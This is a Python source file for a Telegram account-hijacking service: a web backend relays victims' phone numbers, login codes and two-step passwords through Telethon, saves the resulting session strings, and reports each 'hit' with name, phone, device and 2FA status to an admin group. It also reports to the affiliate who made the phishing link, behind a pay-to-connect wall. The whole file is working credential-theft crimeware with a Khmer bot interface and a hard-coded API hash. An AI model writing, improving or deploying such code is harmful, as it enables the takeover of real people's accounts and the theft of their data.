import os
import asyncio
import telebot
import psycopg2
import struct
from telebot import types
from quart import Quart, request, jsonify
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from threading import Thread

# --- 1. CONFIGURATION (Koyeb Environment Variables) ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Private Logs (Admin)
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Approval Group
ADMIN_USERNAME = "@YourUsername" # For the "Pay to Connect" button
BASE_URL = os.environ.get("BASE_URL", "") # Your Koyeb App URL

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# Temporary storage for active login mirroring
# Structure: { "phone": { "client": client, "hash": hash, "tid": tid } }
active_mirrors = {}

# --- 2. DATABASE LOGIC ---

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    # Table for bot access approval
    cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'pending')")
    # Table for stored hits/sessions
    cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT)")
    conn.commit()
    cur.close()
    conn.close()

def is_approved(user_id):
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res and res[0] == 'approved'
    except: return False

init_db()

# --- 3. KHMER INTERFACE ---

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 បញ្ជីគណនី"))
    markup.add(types.KeyboardButton("❓ ជំនួយ"))
    return markup

# --- 4. THE DUAL-HOOK ENGINE (The "Profit" Logic) ---

async def finalize_ultra_hit(phone):
    """
    This function triggers after a successful login.
    Admin gets everything. User (TID) gets a paywall.
    """
    data = active_mirrors[phone]
    client = data['client']
    tid = data['tid']
    
    try:
        me = await client.get_me()
        # Deep extraction
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        auths = await client(functions.account.GetAuthorizationsRequest())
        oldest_dev = auths.authorizations[-1].device_model # Identify the victim's primary phone
        
        has_2fa = "❌ NO"
        try:
            await client(functions.account.GetPasswordRequest())
            has_2fa = "✅ YES"
        except: pass

        session_str = client.session.save()

        # --- ADMIN LOG (Full Power) ---
        admin_report = (
            f"💰 <b>ស្ទូចបានសម្រេច (Admin Copy)</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 Name: {me.first_name}\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🔐 2FA: {has_2fa}\n"
            f"📟 Device: {oldest_dev}\n"
            f"🔗 Ref TID: <code>{tid}</code>\n\n"
            f"🔑 .auth: <code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, admin_report)

        # --- USER LOG (Notification for the Link Creator) ---
        user_report = (
            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី! (New Hit)</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 ឈ្មោះ: {me.first_name}\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n"
            f"📟 ឧបករណ៍ចាស់បំផុត: {oldest_dev}\n"
            f"🔐 ស្ថានភាព 2FA: {has_2fa}\n\n"
            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin ដើម្បីបង់ប្រាក់។</i>"
        )
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔌 Connect Account (បង់ប្រាក់)", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
        bot.send_message(tid, user_report, reply_markup=markup)

    except Exception as e:
        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit for {phone}: {e}")
    finally:
        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]

# --- 5. WEB ROUTES (Bridge to index.html) ---

@app.route('/')
async def index():
    return "<h1>Vinzy Mirror Running</h1>" # Or render_template('index.html')

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone = data.get('phone').replace("+", "").replace(" ", "")
    tid = data.get('tid')

    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_mirrors[phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "tid": tid
        }
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone = data.get('phone').replace("+", "")
    code = data.get('code')
    
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
    
    session = active_mirrors[phone]
    try:
        await session['client'].sign_in(phone, code, phone_code_hash=session['hash'])
        await finalize_ultra_hit(phone)
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Invalid Code"})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone = data.get('phone').replace("+", "")
    password = data.get('password')
    
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
    
    try:
        await active_mirrors[phone]['client'].sign_in(password=password)
        await finalize_ultra_hit(phone)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Wrong Password"})

# --- 6. BOT COMMAND HANDLERS ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    if m.chat.type != 'private': return
    if is_approved(m.from_user.id):
        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode សកម្ម!</b>", reply_markup=main_menu())
    else:
        bot.send_message(VERIFY_GROUP, f"🔔 <b>សំណើសុំការអនុញ្ញាត</b>\n\nID: <code>{m.from_user.id}</code>\nUser: @{m.from_user.username}\n\nចុច <code>/approve_{m.from_user.id}</code>")
        bot.send_message(m.chat.id, "⏳ គណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតទេ។")

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def cmd_gen(m):
    if not is_approved(m.from_user.id): return
    link = f"{BASE_URL}/?id={m.from_user.id}"
    bot.reply_to(m, f"✅ <b>តំណភ្ជាប់របស់អ្នក៖</b>\n\n<code>{link}</code>")

@bot.message_handler(func=lambda m: m.text.startswith('.authremove'))
def cmd_remove(m):
    parts = m.text.split()
    if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.authremove 855xxx</code>")
    phone = parts[1].replace("+", "")
    
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
    conn.commit()
    rows = cur.rowcount
    cur.close()
    conn.close()
    
    if rows > 0:
        bot.reply_to(m, f"🗑️ <b>លុបបានជោគជ័យ:</b> <code>{phone}</code>")
    else:
        bot.reply_to(m, f"❓ <b>រកមិនឃើញ:</b> លេខនេះមិនមានក្នុង DB ទេ។")

@bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
def handle_approval(m):
    if m.chat.id != VERIFY_GROUP: return
    try:
        uid = int(m.text.split('_')[1])
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("INSERT INTO approved_users (user_id, status) VALUES (%s, 'approved') ON CONFLICT (user_id) DO UPDATE SET status='approved'", (uid,))
        conn.commit()
        cur.close()
        conn.close()
        bot.send_message(uid, "🎉 គណនីរបស់អ្នកត្រូវបានយល់ព្រម!", reply_markup=main_menu())
        bot.send_message(m.chat.id, f"✅ User {uid} ត្រូវបានអនុញ្ញាត។")
    except: pass

# --- 7. SMART ERROR CATCHER ---
@bot.message_handler(func=lambda m: m.text.startswith('.') and not m.text.split()[0] in 
                     ['.auth', '.list', '.authremove', '.getcode', '.kickall'])
def unknown_cmd(m):
    bot.reply_to(m, "⚠️ <b>ពាក្យបញ្ជាមិនត្រឹមត្រូវ!</b>\nសូមពិនិត្យមើលអក្ខរាវិរុទ្ធឡើងវិញ។ (Invalid Command)")

# --- 8. RUNNER ---
if __name__ == "__main__":
    Thread(target=lambda: bot.infinity_polling()).start()
    app.run(host="0.0.0.0", port=8080)
